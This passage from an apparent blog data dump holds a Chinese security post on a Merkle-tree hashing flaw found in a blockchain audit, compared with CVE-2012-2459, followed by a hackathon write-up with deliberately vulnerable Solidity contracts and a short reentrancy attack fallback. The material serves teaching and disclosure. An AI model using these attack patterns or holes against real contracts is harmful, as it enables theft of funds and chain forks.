Tree的建立【计算该区块交易的Merkle根】的过程和通常的方式没有太大区别，当区块中交易个数为奇数时，会进行一个这样的操作：\n\n![](https://md.byr.moe/uploads/upload_1e3d765f52afa92e9ea4cc794a26d75a.png)\n\n在计算Merkle根时，若其叶子节点的个数为奇数个，则复制最后一笔交易的Hash值，参与建立Merkle Tree【并不是复制一笔交易出来，不能有重复的交易】。\n\n看上去没有什么太大的问题，只是计算Merkle根时，对边界的处理。但CVE-2012-2459漏洞，利用的就是这一个特性。\n\n#### 区块A：\n\n| tx_id | hash |\n| -------- | -------- |\n| 0     | 3d5c     |\n| 1     | e8aa     |\n| 2     | 7e7f     |\n\n攻击者首先选择,一个有奇数笔交易的区块，构造区块时，将最后一笔交易复制一份，加入该区块中。\n\n#### 区块B:\n\n| tx_id | hash | 备注 | \n| -------- | -------- | ----- |\n| 0     | 3d5c     | \n| 1     | e8aa     |\n| 2     | 7e7f     | \n| 3     | 7e7f     | 重复的交易|\n\n![](https://md.byr.moe/uploads/upload_75d01621f5de14d5b3bf61a8f827159a.png)\n\n\n区块A是一个正常的区块，区块B是拥有重复交易的区块。在共识过程中，会因为tx_3和tx_2一致，而造成出错并抛弃。但这两个区块根据上面的描述，对应的Merkle根是一致的。对应的区块头也是一致的。\n\n攻击者可以构造同样的区块头，在传播广播区块时，广播不同交易列表的区块信息，造成不同节点面对这一区块不能达到共识，进而使区块链分叉，或是进行双花攻击等，危害极大。\n\n### 漏洞利用方式\n\n回到我们的审计过程中，类似上面的例子，思考在此项目中是否也会有类似的攻击手法。\n\n我们发现，对于任意两笔相邻的交易，我们可以调换他们的位置，来使Merkle 根不变，更有甚者，我们可以交换任意一个节点下，两个孩子为根的树的位置，也不会改变Merkle 根的值。\n\n经过对于其他部分对区块和交易的校验分析之后，我们发现可以通过构造两笔特定的交易，造成和上面比特币区块链类似的攻击效果。经过攻击链的设计和验证后，验证了此方法的可能性。此公链在运行过程中，有可能因此漏洞，被进行强制分叉或是双花攻击等。\n\n## 总结\n\n> 汇报该漏洞后，公链开发者十分重视这一问题，响应迅速，立刻修复了该实现问题。\n\n在审计该项目的一些底层实现过程中，我们审计到这个较为经典的漏洞，并根据此漏洞，构造了一条完整的攻击链，达到了对公链强制分叉的影响。这也提醒了我们： **代码千万行，安全第一行。实现不规范，首席两行泪。** 对于已证明安全的密码学方案或技术方案，若实现不规范，亦有可能成为漏洞，造成严重后果。\n\n---\n\n**长亭科技区块链安全组**，在区块链安全技术方面已有相当的积累，拥有多个区块链相关的CVE编号漏洞，曾进行过大量的公链审计、智能合约审计，提供许多企业级服务，并曾对优秀的公链社区提供了许多建设性意见。\n\n","slug":"merkle-tree-vulnerability","published":1,"updated":"2020-02-19T07:29:58.606Z","_id":"ck6rlh7tf000521vwher3kpxd","comments":1,"layout":"post","photos":[],"link":"","content":"<p>之前在职期间审计项目时发现的漏洞，关于公链项目在审计底层merkle tree实现时产生的漏洞。对内容进行了一定的处理，不能介绍完整的攻击链。欢迎大佬们提提意见，看看思路如何。</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>长亭科技@区块链方向安全研究员 Sissel</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>区块链项目态势汹涌，在经历了比特币、以太坊时代之后，大量拥有着不同特点与优势的公链项目如雨后春笋般层出不穷，吸引着人们的眼球。<br>这些项目既拥有区块链1.0、2.0时代中，数字货币交易、去中心化、支持智能合约的特征，也通过更加巧妙的共识机制、更复杂的技术和金融模型，来解决现有的种种问题，助区块链技术步入我们的生活。</p>\n</blockquote>\n<p>在此期间，长亭科技区块链安全组也在关注着诸多公链项目，为这些公链项目的发展与上线保驾护航。在此前一项公链审计的项目过程中，我们发现了一个有意思的关于Merkle Tree底层实现漏洞。下面将分享发现该漏洞的前期技术积累，以及发现过程。</p>\n<h2 id=\"公链项目审计\"><a href=\"#公链项目审计\" class=\"headerlink\" title=\"公链项目审计\"></a>公链项目审计</h2><p>回顾2018年，对于区块链安全从业人员而言，大部分人印象颇深的可能都是以太坊的诸多合约漏洞，EOS公链上层出不穷的合约问题。使用搜索引擎搜索，搜索和区块链相关的审计类文章，也大多为智能合约的check list、智能合约的审计分析等。针对公链审计类的技术分享并无很多。这里推荐大家一份<strong>长亭科技</strong>的<a href=\"https://www.chaitin.cn/zh/reports\" target=\"_blank\" rel=\"noopener\">《区块链安全生存指南》</a>，其中介绍了当下区块链行业环境，以及近年来区块链业内的一些著名事件等。</p>\n<p>审计区块链公链项目，与通常的软件代码审计略有不同。通常的代码审计，我们会考虑语言特性以及该语言的0day或1day漏洞，结合业务场景，分析代码的实现。区块链公链项目，其本身代码量较多，且无较为实用的审计工具。并且在项目背后，还有严谨的金融货币模型以及共识模型。依我理解，我们主要从以下方向入手：</p>\n<ul>\n<li>语言特性及其已知漏洞</li>\n<li>底层实现【密码学、序列化、大数运算等】</li>\n<li>区块链基本元素的实现【区块、交易、链】</li>\n<li>区块链行为的逻辑【生成一个区块、交易进入tx_pool等】</li>\n<li>区块链的其他组件【p2p、rpc、钱包等】</li>\n<li>共识算法合理性</li>\n<li>金融模型合理性</li>\n<li>历史公链漏洞</li>\n<li>【待chief补充2333】</li>\n</ul>\n<h2 id=\"漏洞发现过程\"><a href=\"#漏洞发现过程\" class=\"headerlink\" title=\"漏洞发现过程\"></a>漏洞发现过程</h2><p>我们在审计过程中发现的漏洞利用方式，源于该公链项目在实现Merkle Tree逻辑时，与常规实现方式有些许不同。在整理之前比特币区块链、以太坊区块链，出现过的漏洞时，发现了可能利用的漏洞点，经过确认发现可以影响不同节点间达成共识，进而造成分叉。</p>\n<blockquote>\n<p>在发现问题后，长亭科技立刻汇报给公链项目方，公链开发者响应迅速，非常重视此次安全问题，即刻完成了修复。</p>\n</blockquote>\n<h3 id=\"什么是Merkle-Tree\"><a href=\"#什么是Merkle-Tree\" class=\"headerlink\" title=\"什么是Merkle Tree\"></a>什么是Merkle Tree</h3><p>Merkle Tree，一般也称为Merkle Hash Tree。是数据结构中我们所了解的树，其各个节点均包含Hash值。Merkle Tree具有以下的特点。</p>\n<ol>\n<li>它是一棵树，具有数据结构中，树结构的所有特点。【在讲解中我们默认其为二叉树】</li>\n<li>Merkle Tree的叶子节点中存放数据。非叶子节点的value，是由其左右两子节点，经过组合和Hash运算获得。</li>\n</ol>\n<p>让我们举个例子来表示：</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_1c34db3aeb4504d7966eae58bdbf7cd9.png\" alt></p>\n<p>我们可以看到，只有叶子节点中存放了Data【Tx Hash】，而其上面每一个非叶子节点的value，都是他们孩子的value，经过组合和哈希运算得到的。</p>\n<p>Merkle Tree被广泛应用于对比以及验证处理。在区块链技术中，Merkle Tree被用于验证各区块中的交易，在传输过程中是否被篡改，因为我们可以看到，倘若修改任一叶子节点的内容，这棵Merkle Tree的root节点的值【Merkle根】就会随之改变，可以通过判断Merkle根来得知，该区块中，有交易可能传输出错或被恶意篡改。</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_1e99b3f060d1dec2406c40d8b7a6a2fa.png\" alt></p>\n<h3 id=\"审计中发现的实现方式\"><a href=\"#审计中发现的实现方式\" class=\"headerlink\" title=\"审计中发现的实现方式\"></a>审计中发现的实现方式</h3><p>核心代码【有修改】：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 外层为循环，以建立Merkle Tree</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> hashList[i+<span class=\"number\">1</span>] == <span class=\"literal\">None</span> :</span><br><span class=\"line\">    hashList[p] = sha3(hashList[i]+hashList[i])</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    <span class=\"keyword\">if</span> hashList[i] &gt; hashList[i+<span class=\"number\">1</span>] :</span><br><span class=\"line\">        hashList[p] = sha3(hashList[i]+hashList[i+<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        hashList[p] = sha3(hashList[i+<span class=\"number\">1</span>]+hashList[i])</span><br></pre></td></tr></table></figure></p>\n<p>在审计过程中，当考察到Merkle Tree底层实现方式时，发现其实现有一定违和感，具体如下：</p>\n<ol>\n<li>先根据tx_hash数量，建立一棵完全二叉树</li>\n<li>将tx_hash，按顺序放至叶子节点中</li>\n<li>通过以下算法算得上层节点的Hash值：<ol>\n<li>对于某一非叶子节点，将其两孩子的value进行比较，<strong>序列大者靠前</strong></li>\n<li>将排好的两孩子，进行Hash运算，得到的Hash值为该节点的value</li>\n</ol>\n</li>\n<li>如此往复，建立Merkle Tree，算得根节点的value</li>\n</ol>\n<p>举例说明：</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_e752f85f40b5d33a71e117dacf7b5a3b.png\" alt></p>\n<p>初看此处时，觉得实现Merkle Tree的方式有些奇怪，进行了一次两孩子的value比较，但想到Merkle Tree的主要意义在于校验，防止篡改。实现方式略有不同可能影响不大，遂只做了记录。</p>\n<h3 id=\"Bitcoin漏洞-CVE-2012-2459\"><a href=\"#Bitcoin漏洞-CVE-2012-2459\" class=\"headerlink\" title=\"Bitcoin漏洞 CVE-2012-2459\"></a>Bitcoin漏洞 CVE-2012-2459</h3><p>在整理曾经出现的公链漏洞时，发现了这样一个有名的比特币DoS漏洞。</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_caa4a265690ed28ad7ef5363a5c88dd5.png\" alt></p>\n<p>通过了Merkle Root的根认证的区块，但其实并不合法。可能导致区块链分叉，或是进行双花攻击等，危害性较高，攻击方式较为简单，我们来分析该漏洞成因。</p>\n<p>在旧版本的Bitcoin客户端中，其实现Merkle Tree的建立【计算该区块交易的Merkle根】的过程和通常的方式没有太大区别，当区块中交易个数为奇数时，会进行一个这样的操作：</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_1e3d765f52afa92e9ea4cc794a26d75a.png\" alt></p>\n<p>在计算Merkle根时，若其叶子节点的个数为奇数个，则复制最后一笔交易的Hash值，参与建立Merkle Tree【并不是复制一笔交易出来，不能有重复的交易】。</p>\n<p>看上去没有什么太大的问题，只是计算Merkle根时，对边界的处理。但CVE-2012-2459漏洞，利用的就是这一个特性。</p>\n<h4 id=\"区块A：\"><a href=\"#区块A：\" class=\"headerlink\" title=\"区块A：\"></a>区块A：</h4><table>\n<thead>\n<tr>\n<th>tx_id</th>\n<th>hash</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>3d5c</td>\n</tr>\n<tr>\n<td>1</td>\n<td>e8aa</td>\n</tr>\n<tr>\n<td>2</td>\n<td>7e7f</td>\n</tr>\n</tbody>\n</table>\n<p>攻击者首先选择,一个有奇数笔交易的区块，构造区块时，将最后一笔交易复制一份，加入该区块中。</p>\n<h4 id=\"区块B\"><a href=\"#区块B\" class=\"headerlink\" title=\"区块B:\"></a>区块B:</h4><table>\n<thead>\n<tr>\n<th>tx_id</th>\n<th>hash</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>3d5c</td>\n</tr>\n<tr>\n<td>1</td>\n<td>e8aa</td>\n</tr>\n<tr>\n<td>2</td>\n<td>7e7f</td>\n</tr>\n<tr>\n<td>3</td>\n<td>7e7f</td>\n<td>重复的交易</td>\n</tr>\n</tbody>\n</table>\n<p><img src=\"https://md.byr.moe/uploads/upload_75d01621f5de14d5b3bf61a8f827159a.png\" alt></p>\n<p>区块A是一个正常的区块，区块B是拥有重复交易的区块。在共识过程中，会因为tx_3和tx_2一致，而造成出错并抛弃。但这两个区块根据上面的描述，对应的Merkle根是一致的。对应的区块头也是一致的。</p>\n<p>攻击者可以构造同样的区块头，在传播广播区块时，广播不同交易列表的区块信息，造成不同节点面对这一区块不能达到共识，进而使区块链分叉，或是进行双花攻击等，危害极大。</p>\n<h3 id=\"漏洞利用方式\"><a href=\"#漏洞利用方式\" class=\"headerlink\" title=\"漏洞利用方式\"></a>漏洞利用方式</h3><p>回到我们的审计过程中，类似上面的例子，思考在此项目中是否也会有类似的攻击手法。</p>\n<p>我们发现，对于任意两笔相邻的交易，我们可以调换他们的位置，来使Merkle 根不变，更有甚者，我们可以交换任意一个节点下，两个孩子为根的树的位置，也不会改变Merkle 根的值。</p>\n<p>经过对于其他部分对区块和交易的校验分析之后，我们发现可以通过构造两笔特定的交易，造成和上面比特币区块链类似的攻击效果。经过攻击链的设计和验证后，验证了此方法的可能性。此公链在运行过程中，有可能因此漏洞，被进行强制分叉或是双花攻击等。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><blockquote>\n<p>汇报该漏洞后，公链开发者十分重视这一问题，响应迅速，立刻修复了该实现问题。</p>\n</blockquote>\n<p>在审计该项目的一些底层实现过程中，我们审计到这个较为经典的漏洞，并根据此漏洞，构造了一条完整的攻击链，达到了对公链强制分叉的影响。这也提醒了我们： <strong>代码千万行，安全第一行。实现不规范，首席两行泪。</strong> 对于已证明安全的密码学方案或技术方案，若实现不规范，亦有可能成为漏洞，造成严重后果。</p>\n<hr>\n<p><strong>长亭科技区块链安全组</strong>，在区块链安全技术方面已有相当的积累，拥有多个区块链相关的CVE编号漏洞，曾进行过大量的公链审计、智能合约审计，提供许多企业级服务，并曾对优秀的公链社区提供了许多建设性意见。</p>\n","site":{"data":{}},"excerpt":"<p>之前在职期间审计项目时发现的漏洞，关于公链项目在审计底层merkle tree实现时产生的漏洞。对内容进行了一定的处理，不能介绍完整的攻击链。欢迎大佬们提提意见，看看思路如何。</p>","more":"<blockquote>\n<p>长亭科技@区块链方向安全研究员 Sissel</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>区块链项目态势汹涌，在经历了比特币、以太坊时代之后，大量拥有着不同特点与优势的公链项目如雨后春笋般层出不穷，吸引着人们的眼球。<br>这些项目既拥有区块链1.0、2.0时代中，数字货币交易、去中心化、支持智能合约的特征，也通过更加巧妙的共识机制、更复杂的技术和金融模型，来解决现有的种种问题，助区块链技术步入我们的生活。</p>\n</blockquote>\n<p>在此期间，长亭科技区块链安全组也在关注着诸多公链项目，为这些公链项目的发展与上线保驾护航。在此前一项公链审计的项目过程中，我们发现了一个有意思的关于Merkle Tree底层实现漏洞。下面将分享发现该漏洞的前期技术积累，以及发现过程。</p>\n<h2 id=\"公链项目审计\"><a href=\"#公链项目审计\" class=\"headerlink\" title=\"公链项目审计\"></a>公链项目审计</h2><p>回顾2018年，对于区块链安全从业人员而言，大部分人印象颇深的可能都是以太坊的诸多合约漏洞，EOS公链上层出不穷的合约问题。使用搜索引擎搜索，搜索和区块链相关的审计类文章，也大多为智能合约的check list、智能合约的审计分析等。针对公链审计类的技术分享并无很多。这里推荐大家一份<strong>长亭科技</strong>的<a href=\"https://www.chaitin.cn/zh/reports\" target=\"_blank\" rel=\"noopener\">《区块链安全生存指南》</a>，其中介绍了当下区块链行业环境，以及近年来区块链业内的一些著名事件等。</p>\n<p>审计区块链公链项目，与通常的软件代码审计略有不同。通常的代码审计，我们会考虑语言特性以及该语言的0day或1day漏洞，结合业务场景，分析代码的实现。区块链公链项目，其本身代码量较多，且无较为实用的审计工具。并且在项目背后，还有严谨的金融货币模型以及共识模型。依我理解，我们主要从以下方向入手：</p>\n<ul>\n<li>语言特性及其已知漏洞</li>\n<li>底层实现【密码学、序列化、大数运算等】</li>\n<li>区块链基本元素的实现【区块、交易、链】</li>\n<li>区块链行为的逻辑【生成一个区块、交易进入tx_pool等】</li>\n<li>区块链的其他组件【p2p、rpc、钱包等】</li>\n<li>共识算法合理性</li>\n<li>金融模型合理性</li>\n<li>历史公链漏洞</li>\n<li>【待chief补充2333】</li>\n</ul>\n<h2 id=\"漏洞发现过程\"><a href=\"#漏洞发现过程\" class=\"headerlink\" title=\"漏洞发现过程\"></a>漏洞发现过程</h2><p>我们在审计过程中发现的漏洞利用方式，源于该公链项目在实现Merkle Tree逻辑时，与常规实现方式有些许不同。在整理之前比特币区块链、以太坊区块链，出现过的漏洞时，发现了可能利用的漏洞点，经过确认发现可以影响不同节点间达成共识，进而造成分叉。</p>\n<blockquote>\n<p>在发现问题后，长亭科技立刻汇报给公链项目方，公链开发者响应迅速，非常重视此次安全问题，即刻完成了修复。</p>\n</blockquote>\n<h3 id=\"什么是Merkle-Tree\"><a href=\"#什么是Merkle-Tree\" class=\"headerlink\" title=\"什么是Merkle Tree\"></a>什么是Merkle Tree</h3><p>Merkle Tree，一般也称为Merkle Hash Tree。是数据结构中我们所了解的树，其各个节点均包含Hash值。Merkle Tree具有以下的特点。</p>\n<ol>\n<li>它是一棵树，具有数据结构中，树结构的所有特点。【在讲解中我们默认其为二叉树】</li>\n<li>Merkle Tree的叶子节点中存放数据。非叶子节点的value，是由其左右两子节点，经过组合和Hash运算获得。</li>\n</ol>\n<p>让我们举个例子来表示：</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_1c34db3aeb4504d7966eae58bdbf7cd9.png\" alt></p>\n<p>我们可以看到，只有叶子节点中存放了Data【Tx Hash】，而其上面每一个非叶子节点的value，都是他们孩子的value，经过组合和哈希运算得到的。</p>\n<p>Merkle Tree被广泛应用于对比以及验证处理。在区块链技术中，Merkle Tree被用于验证各区块中的交易，在传输过程中是否被篡改，因为我们可以看到，倘若修改任一叶子节点的内容，这棵Merkle Tree的root节点的值【Merkle根】就会随之改变，可以通过判断Merkle根来得知，该区块中，有交易可能传输出错或被恶意篡改。</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_1e99b3f060d1dec2406c40d8b7a6a2fa.png\" alt></p>\n<h3 id=\"审计中发现的实现方式\"><a href=\"#审计中发现的实现方式\" class=\"headerlink\" title=\"审计中发现的实现方式\"></a>审计中发现的实现方式</h3><p>核心代码【有修改】：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 外层为循环，以建立Merkle Tree</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> hashList[i+<span class=\"number\">1</span>] == <span class=\"literal\">None</span> :</span><br><span class=\"line\">    hashList[p] = sha3(hashList[i]+hashList[i])</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    <span class=\"keyword\">if</span> hashList[i] &gt; hashList[i+<span class=\"number\">1</span>] :</span><br><span class=\"line\">        hashList[p] = sha3(hashList[i]+hashList[i+<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        hashList[p] = sha3(hashList[i+<span class=\"number\">1</span>]+hashList[i])</span><br></pre></td></tr></table></figure></p>\n<p>在审计过程中，当考察到Merkle Tree底层实现方式时，发现其实现有一定违和感，具体如下：</p>\n<ol>\n<li>先根据tx_hash数量，建立一棵完全二叉树</li>\n<li>将tx_hash，按顺序放至叶子节点中</li>\n<li>通过以下算法算得上层节点的Hash值：<ol>\n<li>对于某一非叶子节点，将其两孩子的value进行比较，<strong>序列大者靠前</strong></li>\n<li>将排好的两孩子，进行Hash运算，得到的Hash值为该节点的value</li>\n</ol>\n</li>\n<li>如此往复，建立Merkle Tree，算得根节点的value</li>\n</ol>\n<p>举例说明：</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_e752f85f40b5d33a71e117dacf7b5a3b.png\" alt></p>\n<p>初看此处时，觉得实现Merkle Tree的方式有些奇怪，进行了一次两孩子的value比较，但想到Merkle Tree的主要意义在于校验，防止篡改。实现方式略有不同可能影响不大，遂只做了记录。</p>\n<h3 id=\"Bitcoin漏洞-CVE-2012-2459\"><a href=\"#Bitcoin漏洞-CVE-2012-2459\" class=\"headerlink\" title=\"Bitcoin漏洞 CVE-2012-2459\"></a>Bitcoin漏洞 CVE-2012-2459</h3><p>在整理曾经出现的公链漏洞时，发现了这样一个有名的比特币DoS漏洞。</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_caa4a265690ed28ad7ef5363a5c88dd5.png\" alt></p>\n<p>通过了Merkle Root的根认证的区块，但其实并不合法。可能导致区块链分叉，或是进行双花攻击等，危害性较高，攻击方式较为简单，我们来分析该漏洞成因。</p>\n<p>在旧版本的Bitcoin客户端中，其实现Merkle Tree的建立【计算该区块交易的Merkle根】的过程和通常的方式没有太大区别，当区块中交易个数为奇数时，会进行一个这样的操作：</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_1e3d765f52afa92e9ea4cc794a26d75a.png\" alt></p>\n<p>在计算Merkle根时，若其叶子节点的个数为奇数个，则复制最后一笔交易的Hash值，参与建立Merkle Tree【并不是复制一笔交易出来，不能有重复的交易】。</p>\n<p>看上去没有什么太大的问题，只是计算Merkle根时，对边界的处理。但CVE-2012-2459漏洞，利用的就是这一个特性。</p>\n<h4 id=\"区块A：\"><a href=\"#区块A：\" class=\"headerlink\" title=\"区块A：\"></a>区块A：</h4><table>\n<thead>\n<tr>\n<th>tx_id</th>\n<th>hash</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>3d5c</td>\n</tr>\n<tr>\n<td>1</td>\n<td>e8aa</td>\n</tr>\n<tr>\n<td>2</td>\n<td>7e7f</td>\n</tr>\n</tbody>\n</table>\n<p>攻击者首先选择,一个有奇数笔交易的区块，构造区块时，将最后一笔交易复制一份，加入该区块中。</p>\n<h4 id=\"区块B\"><a href=\"#区块B\" class=\"headerlink\" title=\"区块B:\"></a>区块B:</h4><table>\n<thead>\n<tr>\n<th>tx_id</th>\n<th>hash</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>3d5c</td>\n</tr>\n<tr>\n<td>1</td>\n<td>e8aa</td>\n</tr>\n<tr>\n<td>2</td>\n<td>7e7f</td>\n</tr>\n<tr>\n<td>3</td>\n<td>7e7f</td>\n<td>重复的交易</td>\n</tr>\n</tbody>\n</table>\n<p><img src=\"https://md.byr.moe/uploads/upload_75d01621f5de14d5b3bf61a8f827159a.png\" alt></p>\n<p>区块A是一个正常的区块，区块B是拥有重复交易的区块。在共识过程中，会因为tx_3和tx_2一致，而造成出错并抛弃。但这两个区块根据上面的描述，对应的Merkle根是一致的。对应的区块头也是一致的。</p>\n<p>攻击者可以构造同样的区块头，在传播广播区块时，广播不同交易列表的区块信息，造成不同节点面对这一区块不能达到共识，进而使区块链分叉，或是进行双花攻击等，危害极大。</p>\n<h3 id=\"漏洞利用方式\"><a href=\"#漏洞利用方式\" class=\"headerlink\" title=\"漏洞利用方式\"></a>漏洞利用方式</h3><p>回到我们的审计过程中，类似上面的例子，思考在此项目中是否也会有类似的攻击手法。</p>\n<p>我们发现，对于任意两笔相邻的交易，我们可以调换他们的位置，来使Merkle 根不变，更有甚者，我们可以交换任意一个节点下，两个孩子为根的树的位置，也不会改变Merkle 根的值。</p>\n<p>经过对于其他部分对区块和交易的校验分析之后，我们发现可以通过构造两笔特定的交易，造成和上面比特币区块链类似的攻击效果。经过攻击链的设计和验证后，验证了此方法的可能性。此公链在运行过程中，有可能因此漏洞，被进行强制分叉或是双花攻击等。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><blockquote>\n<p>汇报该漏洞后，公链开发者十分重视这一问题，响应迅速，立刻修复了该实现问题。</p>\n</blockquote>\n<p>在审计该项目的一些底层实现过程中，我们审计到这个较为经典的漏洞，并根据此漏洞，构造了一条完整的攻击链，达到了对公链强制分叉的影响。这也提醒了我们： <strong>代码千万行，安全第一行。实现不规范，首席两行泪。</strong> 对于已证明安全的密码学方案或技术方案，若实现不规范，亦有可能成为漏洞，造成严重后果。</p>\n<hr>\n<p><strong>长亭科技区块链安全组</strong>，在区块链安全技术方面已有相当的积累，拥有多个区块链相关的CVE编号漏洞，曾进行过大量的公链审计、智能合约审计，提供许多企业级服务，并曾对优秀的公链社区提供了许多建设性意见。</p>"},{"title":"【writeup】DoraHacks 区块链安全Hackathon","date":"2018-10-15T05:48:32.000Z","_content":"\n早先就对DoraHacks举办的各种hackathon有所耳闻，一直想来参加感受一次，这次很高兴天枢能够受邀参加本场区块链安全比赛，与诸位师傅共同度过一个知性而优雅的周末。各大厂商在周六都分享了许多有意思的思路、或是自家引以为傲的产品和解决方案，开拓了我和小伙伴们的眼界。一下午的展示中收获了良多干货，为第二天的比赛也开拓了思路。\n\n本次见识到了平时只能在线上看到的诸位大师傅，也有幸享受到了师傅们精心准备的题目，包含了合约审计、漏洞利用、硬件方案、密码学、交易所安全等多个类型，受益良多。也吐槽一句，师傅们颜值都好高呀！\n\n这里给出Q1、4、11、14、15 我们队的解答。\n\n<!-- more -->\n\n## 题目wp\n\n### Q1 - 测试题\n\n主办方提供了四个合约，需要我们给出漏洞点和修复方案，并按要求对某几个合约写出攻击合约。\n\n#### Auction.sol\n\n```\npragma solidity ^0.4.10;\n\ncontract Auction {\n    address public highestBidder;\n    uint256 public highestBid;\n\n    function Auction(uint256 _highestBid) {\n        require(_highestBid > 0);\n        // 设置起拍价格        \n        highestBid = _highestBid;\n        highestBidder = msg.sender;\n    }\n    \n    function bid() payable {\n        require(msg.value > highestBid);\n        // 退还上一位竞拍者资金\n        highestBidder.transfer(highestBid);\n\n        highestBidder = msg.sender;\n        highestBid = msg.value;\n\n    }\n\n    // 根据区块高度或者时间等，结束拍卖\n    function auction_end() {\n        // ...\n    }\n}\n```\n\n很典型的King/拍卖合约，问题出在了出现下一个高价者时，上一个人退款时的transfer()。我们可以构造一个攻击合约，他的回调函数是payable，且函数中revert()或throw。即让我们的攻击合约，作为最高出价者，并且不能接受转账即可。\n\n#### BankOwned.sol\n\n```\ncontract Owned {\n    address public owner;\n    function Owned() { owner = msg.sender; }\n    modifier onlyOwner{ if (msg.sender != owner) revert(); _; }\n}\n\ncontract Bank is Owned {\n    address public owner = msg.sender;\n    \n\n    function transferOwner(address new_owner) public onlyOwner payable {\n         owner = new_owner;\n    }\n\n    function withdraw(uint amount) public onlyOwner {\n        require(amount <= this.balance);\n        msg.sender.transfer(amount);\n    }\n}\n```\n\n这里我认为是继承了Owned()函数，出现了问题，solidity的继承原理是代码拷贝，所有人都可以调用Bank里的Owned函数，但我之后并未调通，希望大家指正这里。\n\n#### MyContacts.sol\n\n```\npragma solidity ^0.4.0;\n\ncontract MyContacts {\n\n        struct PersonInfo {\n            address person;\n            string phoneNumber;\n            string note;\n        }\n        \n        address private owner;\n        \n        mapping(address => PersonInfo) contacts;\n\n        function MyContacts() {\n            owner = msg.sender;\n        }\n\n        function addContact(address _person, string _phoneNumber, string _note) public {\n            PersonInfo info;\n            info.person = _person;\n            info.phoneNumber = _phoneNumber;\n            info.note = _note;\n            contacts[msg.sender] = info;\n        }\n}\n```\n\n在函数里声明，会覆盖变量。\n\n这里举个[启明的文章](https://paper.seebug.org/661/)，方便理解，师傅们在第一天的演讲中也提到了这一点。\n```\npragma solidity 0.4.24;\n\ncontract test {\n\n    struct aa{\n        uint x;\n        uint y;\n    }\n\n    uint public a = 4;\n    uint public b = 6;\n\n    function test1() returns (uint){\n        aa x;\n        x.x = 9;\n        x.y = 7;\n    }\n}\n```\n\n函数test1中定义了一个局部结构体变量x，但是没有对其进行初始化。根据solidity的变量存储规则，这时候x是存储在storage中的，而且是从索引0开始，那么对其成员变量x,y赋值之后，刚好覆盖了全局变量a和b。\n\n#### PrivateBank.sol\n\n```\npragma solidity ^0.4.15;\n\ncontract PrivateBank {\n    mapping (address => uint) userBalance;\n   \n    function getBalance(address u) constant returns(uint){\n        return userBalance[u];\n    }\n\n    function addToBalance() payable{\n        userBalance[msg.sender] += msg.value;\n    }   \n\n    function withdrawBalance(){\n        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){\n            throw;\n        }\n        userBalance[msg.sender] = 0;\n    }   \n}\n```\n\n看名字都猜出来了，肯定是重入漏洞啦\n```\nmsg.sender.call.value(userBalance[msg.sender])()\n```\n攻击的话call一下就好了hhh。\n\n```\n先让攻击合约充一点钱\nfunction () payable public{\n    victim.call(bytes4(keccak256(\"withdrawBalance()\")));\n}\n```\n\n### Q4 - 游戏逻辑题，找出三个漏洞\n\n这个题最后只有我们天枢给出了主办方满意的回答，已经在赛后分享和大家讨论过了。\n\n也是之前在创宇404的时候，和Lorexxar'师傅经常一起审合约，养成的好习惯。很喜欢这道题，出题的师傅说，请大家把它仅仅当作游戏合约来看待，而不是蜜罐之类的hh。我还蛮喜欢这种心态的。\n\n```\npragma solidity ^0.4.0;\n\n// Bet Game\ncontract BetGame {\n\taddress owner;\t\t\t\t\t                // 合约持有者\n\tmapping(address => uint256) public balanceOf;\t// 用户资金集\n\t\n\tuint256 public cutOffBlockNumber;\t\t        // 下注截止到cutOffBlockNumber,至少有1000个块的距离到创建合约的块\n\tuint256 public status; \t\t\t\t            // 状态，根据每次下注修改状态\n\tmapping(address => uint256) public positiveSet;\t// 赌注正面赢: status == 1\n\tmapping(address => uint256) public negativeSet;\t// 赌注反面赢: status == 0\n\tuint256 public positiveBalance;\t\t\t        // 正面下注资金总额\n\tuint256 public negativeBalance;\t\t\t        // 反面下注资金总额\n\n\tmodifier isOwner {\n\t\tassert(owner == 